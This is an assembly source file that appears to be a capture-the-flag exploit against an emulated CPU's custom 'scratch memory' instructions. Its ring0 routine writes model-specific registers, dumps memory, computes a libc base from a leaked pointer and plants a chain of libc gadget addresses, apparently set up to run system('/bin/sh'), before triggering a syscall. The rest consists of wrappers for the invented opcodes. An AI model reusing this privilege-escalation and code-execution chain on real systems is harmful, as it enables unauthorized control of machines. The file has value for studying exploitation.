    global get_scratch_info
    global load_scratch
    global read_scratch
    global clear_scratch
    global add_slices
    global sub_slices
    global mul_slices
    global read_scratch_base
    global ring0
    global ring0_size

%macro mts 0
    db 0x0f, 0x0a, 0x83
%endmacro

%macro stm 0
    db 0x0f, 0x0a, 0x84
%endmacro

%macro fscr 0
    db 0x0f, 0x0a, 0x85
%endmacro

%macro scradd 0
    db 0x0f, 0x0a, 0x86
%endmacro

%macro scrsub 0
    db 0x0f, 0x0a, 0x87
%endmacro

%macro scrmul 0
    db 0x0f, 0x0a, 0x88
%endmacro

%macro scrhlr 0
    db 0x0f, 0x0a, 0x8a
%endmacro

%macro scrhlw 0
    db 0x0f, 0x0a, 0x89
%endmacro

%macro pushall 0
    push rax
    push rcx
    push rdx
    push rbx
    push rdi
    push rsi
    push rbp
%endmacro

%macro popall 0
    pop rbp
    pop rsi
    pop rdi
    pop rbx
    pop rdx
    pop rcx
    pop rax
%endmacro

    section .bss
marker: resq 0
scratch: times 0x100000 resq 0

    section .text

ring0:
    cli
    push rax
    push rdx
    push rcx

    mov rbx, 0xfffffe0000000000
    invlpg [rbx]

    ; mov rax, 0x1337000
    ; call rax

    mov ecx, 0xC0000106
    mov eax, 128
    xor edx, edx
    wrmsr

    mov ecx, 0xC0000105
    mov eax, 0x1000
    xor edx, edx
    wrmsr

    mov rdi, 0x1337000
    scrhlw

;     lea rbx, qword [marker]
;     mov rax, `AAAABBBB`
;     mov qword [rbx], rax

;     lea rbx, qword [scratch]
;     xor esi, esi

; scan:
;     mov rax, qword [rdi]
;     cmp rax, 0
;     je .next

;     mov qword [rbx], rsi
;     mov qword [rbx + 8], rax
;     add rbx, 16

; .next:
;     add rdi, 8
;     inc esi
;     cmp rdi, 0x1345fb0
;     jl scan

;     lea rbx, [scratch]
    ; mov rax, 0x1337000
    ; call rax

    ; 0x1fc3 + 0x1d8

    mov rax, 0x1337000
    mov rdx, (0x1fc3 + 0x1d8) * 8
    add rax, rdx

    mov rbx, 0x1337000 + (0x0000000000001ca2) * 8
    mov rbx, qword [rbx]
    sub rbx, 0x203ac0
    ; rbx is libc base

    lea rcx, [rbx + 0x000000000010f75b]
    mov qword [rax], rcx

    ; lea rcx, [rbx + 0x2a390]
    ; mov qword [rax], rcx

    lea rcx, [rbx + 0x1cb42f]
    mov qword [rax + 8], rcx

    lea rcx, [rbx + 0x000000000010f75b + 1]
    mov qword [rax + 16], rcx

    lea rcx, [rbx + 0x58740]
    mov qword [rax + 24], rcx

    syscall

    ; 0x1ca1

    jmp $
    
    pop rcx
    pop rdx
    pop rax
    iretq
ring0_size: dq $ - ring0

read_scratch_base:
    scrhlr
    ret

get_scratch_info:
    ; Arguments passed to this function:
    ; ptr to structure containing info -> rdi
    ;    0..7: base
    ;    8..15: default size
    ;    16..19: slice size
    ;    20..21: num slices
    pushall

    mov rax, 0x80000022
    cpuid
    mov dword [rdi], edx
    mov dword [rdi + 4], ebx
    mov qword [rdi + 8], rax

    push rcx
    shr rcx, 10
    mov dword [rdi + 16], ecx
    pop rcx
    and rcx, 0xFF
    mov byte [rdi + 20], cl
    
    popall
    ret

load_scratch:
    ; Arguments passed to this function:
    ; slice        -> rdi
    ; slice_offset -> rsi
    ; source       -> rdx
    ; length       -> rcx

    ; Move arguments to desired registers
    pushall

    mov rbx, rdi      ; Move slice to rbx
    mov rdi, rsi      ; Move slice_offset to rdi
    mov rsi, rdx      ; Move source to rsi
    mov rcx, rcx      ; Length is already in rcx

    mts ; load into scratch memory

    popall

    ret               ; Return to the caller

read_scratch:
    ; Arguments passed to this function:
    ; slice        -> rdi
    ; slice_offset -> rsi
    ; source       -> rdx
    ; length       -> rcx

    ; Move arguments to desired registers
    pushall
    mov rbx, rdi      ; Move slice to rbx
    mov rdi, rsi      ; Move slice_offset to rdi
    mov rsi, rdx      ; Move destination to rsi
    mov rcx, rcx      ; Length is already in rcx

    stm

    popall

    ret               ; Return to the caller

clear_scratch:
    fscr
    ret

add_slices:
    ; Arguments passed to this function:
    ; slice A      -> rdi
    ; slice B      -> rsi
    ; slice C      -> rdx
    scradd
    ret

sub_slices:
    ; Arguments passed to this function:
    ; slice A      -> rdi
    ; slice B      -> rsi
    ; slice C      -> rdx
    scrsub
    ret

mul_slices:
    ; Arguments passed to this function:
    ; slice A      -> rdi
    ; slice B      -> rsi
    ; slice C      -> rdx
    scrmul
    ret
